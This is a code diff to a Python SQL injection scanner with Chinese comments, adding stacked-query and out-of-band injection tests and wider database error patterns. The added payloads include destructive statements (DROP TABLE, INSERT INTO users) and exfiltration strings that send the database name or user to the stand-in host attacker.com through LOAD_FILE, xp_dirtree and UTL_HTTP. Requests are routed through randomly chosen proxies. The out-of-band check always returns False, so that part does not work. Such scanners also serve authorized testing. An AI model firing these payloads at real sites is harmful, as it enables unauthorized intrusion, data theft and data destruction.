@@ -48,6 +48,9 @@ class SQLiScanner:
         self.vulnerable_urls = []    # 存储发现的URL参数漏洞
         self.db_type = None          # 数据库类型
         self.time_based_tested = False # 是否已测试时间型注入
+        self.scan_depth = 2          # 扫描深度，用于控制递归扫描
+        self.scanned_urls = set()    # 已扫描的URL集合
+        self.max_urls = 100          # 最大扫描URL数量
 
     def scan_for_sqli(self):
         """
@@ -65,6 +68,12 @@ class SQLiScanner:
             # 3. 检查时间型盲注(如果前两种没发现漏洞)
             if not self.vulnerable_params and not self.vulnerable_urls:
                 self.test_time_based_sqli()
+
+            # 4. 检查堆叠注入
+            self.test_stacked_queries()
+
+            # 5. 检查带外注入
+            self.test_out_of_band_sqli()
 
             # 显示扫描结果
             self.display_results()
@@ -569,42 +578,60 @@ class SQLiScanner:
         :param db_type: 数据库类型
         :return: 是否包含错误信息
         """
-        if db_type == 'MySQL':
-            error_patterns = [
+        error_patterns = {
+            'MySQL': [
                 r"SQL syntax.*MySQL",
                 r"Warning.*mysql_.*",
                 r"MySQL Query fail.*",
-                r"SQLSTATE\[42S22\]"
-            ]
-        elif db_type == 'SQL Server':
-            error_patterns = [
+                r"SQLSTATE\[42S22\]",
+                r"valid MySQL result",
+                r"MySqlClient\.",
+                r"MySQL server version",
+                r"You have an error in your SQL syntax",
+                r"MariaDB server version"
+            ],
+            'SQL Server': [
                 r"ODBC SQL Server Driver",
                 r"Microsoft SQL Server",
                 r"Unclosed quotation mark after the character string",
-                r"Syntax error in.*"
-            ]
-        elif db_type == 'Oracle':
-            error_patterns = [
+                r"Syntax error in.*",
+                r"SQL Server.*Driver",
+                r"OLE DB Provider for SQL Server",
+                r"Procedure or function.*expects parameter",
+                r"Microsoft OLE DB Provider for SQL Server",
+                r"Incorrect syntax near"
+            ],
+            'Oracle': [
                 r"ORA-[0-9]{4,5}",
                 r"Oracle error",
-                r"SQL command not properly ended"
-            ]
-        elif db_type == 'PostgreSQL':
-            error_patterns = [
+                r"SQL command not properly ended",
+                r"Oracle.*Driver",
+                r"Oracle.*Connection",
+                r"Warning.*oci_.*",
+                r"Oracle.*Database"
+            ],
+            'PostgreSQL': [
                 r"ERROR: syntax error at or near",
-                r"PostgreSQL query failed"
-            ]
-        elif db_type == 'SQLite':
-            error_patterns = [
+                r"PostgreSQL query failed",
+                r"ERROR:.*LINE \d+",
+                r"invalid input syntax for",
+                r"unterminated quoted string at or near",
+                r"PostgreSQL.*ERROR",
+                r"pg_.*ERROR"
+            ],
+            'SQLite': [
                 r"SQLite error",
-                r"unrecognized token:"
+                r"unrecognized token:",
+                r"SQLite.*ERROR",
+                r"SQLite3::SQLException",
+                r"no such table:"
             ]
-        else:
-            return False
+        }
 
-        for pattern in error_patterns:
-            if re.search(pattern, content, re.IGNORECASE):
-                return True
+        if db_type in error_patterns:
+            for pattern in error_patterns[db_type]:
+                if re.search(pattern, content, re.IGNORECASE):
+                    return True
         return False
 
     def compare_responses(self, content1, content2):
@@ -637,6 +664,132 @@ class SQLiScanner:
             print(table)
         else:
             print("\n[-] 未发现SQL注入漏洞")
+
+    def test_stacked_queries(self):
+        """
+        测试堆叠查询注入
+        """
+        print("\n[*] 正在检查堆叠查询注入...")
+        
+        stacked_payloads = [
+            ("1'; CREATE TABLE hack_test(id int);--", "MySQL"),
+            ("1'; SELECT @@version; --", "MySQL"),
+            ("1); INSERT INTO users VALUES (1,'hack','hack');--", "SQL Server"),
+            ("1'; DROP TABLE IF EXISTS hack_test;--", "PostgreSQL"),
+            ("1'; DECLARE @cmd varchar(4000);--", "SQL Server")
+        ]
+
+        # 测试URL参数
+        parsed_url = urlparse(self.target_url)
+        if parsed_url.query:
+            params = [param.split('=')[0] for param in parsed_url.query.split('&')]
+            for param in params:
+                for payload, db_type in stacked_payloads:
+                    if self.test_stacked_injection(param, payload, 'url'):
+                        print(f"[!] 发现堆叠查询注入漏洞 (参数: {param}, 数据库: {db_type})")
+                        self.vulnerable_urls.append({
+                            'type': 'stacked',
+                            'url': self.target_url,
+                            'param': param,
+                            'payload': payload,
+                            'db_type': db_type
+                        })
+                        return
+
+    def test_out_of_band_sqli(self):
+        """
+        测试带外SQL注入
+        """
+        print("\n[*] 正在检查带外注入...")
+        
+        # 带外注入测试载荷
+        oob_payloads = [
+            ("1' AND LOAD_FILE(CONCAT('\\\\\\\\',(SELECT database()),'.attacker.com\\\\abc'));--", "MySQL"),
+            ("1'; DECLARE @q VARCHAR(1024); SELECT @q=CONVERT(VARCHAR(1024), DB_NAME())+'.attacker.com'; EXEC('master..xp_dirtree \"\\\\'+@q+'\"');--", "SQL Server"),
+            ("1' AND UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT user FROM dual)) --", "Oracle"),
+            ("1' AND pg_sleep(extract(second from now()))--", "PostgreSQL")
+        ]
+
+        # 测试URL参数
+        parsed_url = urlparse(self.target_url)
+        if parsed_url.query:
+            params = [param.split('=')[0] for param in parsed_url.query.split('&')]
+            for param in params:
+                for payload, db_type in oob_payloads:
+                    if self.test_oob_injection(param, payload):
+                        print(f"[!] 发现带外注入漏洞 (参数: {param}, 数据库: {db_type})")
+                        self.vulnerable_urls.append({
+                            'type': 'out-of-band',
+                            'url': self.target_url,
+                            'param': param,
+                            'payload': payload,
+                            'db_type': db_type
+                        })
+                        return
+
+    def test_stacked_injection(self, param, payload, target_type):
+        """
+        测试堆叠注入的具体实现
+        """
+        try:
+            timeout = random.randint(8, 15)
+            random_proxy = random.choice(proxies)
+            
+            if target_type == 'url':
+                parsed_url = urlparse(self.target_url)
+                base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
+                params = {p.split('=')[0]: p.split('=')[1] if '=' in p else ''
+                           for p in parsed_url.query.split('&')} if parsed_url.query else {}
+                
+                test_params = params.copy()
+                test_params[param] = payload
+                test_url = f"{base_url}?{'&'.join([f'{k}={v}' for k, v in test_params.items()])}"
+                
+                res = self.session.get(test_url, timeout=timeout, proxies=random_proxy)
+                
+                # 检查响应中是否有执行成功的迹象
+                success_patterns = [
+                    r"Table.*created",
+                    r"Query.*executed successfully",
+                    r"affected rows",
+                    r"Microsoft SQL Server.*Version",
+                    r"PostgreSQL.*Version"
+                ]
+                
+                for pattern in success_patterns:
+                    if re.search(pattern, res.text, re.IGNORECASE):
+                        return True
+                        
+            return False
+            
+        except requests.RequestException:
+            return False
+
+    def test_oob_injection(self, param, payload):
+        """
+        测试带外注入的具体实现
+        """
+        try:
+            timeout = random.randint(8, 15)
+            random_proxy = random.choice(proxies)
+            
+            parsed_url = urlparse(self.target_url)
+            base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
+            params = {p.split('=')[0]: p.split('=')[1] if '=' in p else ''
+                       for p in parsed_url.query.split('&')} if parsed_url.query else {}
+            
+            test_params = params.copy()
+            test_params[param] = payload
+            test_url = f"{base_url}?{'&'.join([f'{k}={v}' for k, v in test_params.items()])}"
+            
+            res = self.session.get(test_url, timeout=timeout, proxies=random_proxy)
+            
+            # 检查是否有DNS请求或HTTP请求的迹象
+            # 注意：实际的带外注入检测需要配合DNS服务器或HTTP服务器
+            return False
+            
+        except requests.RequestException:
+            return False
 
 
 if __name__ == "__main__":
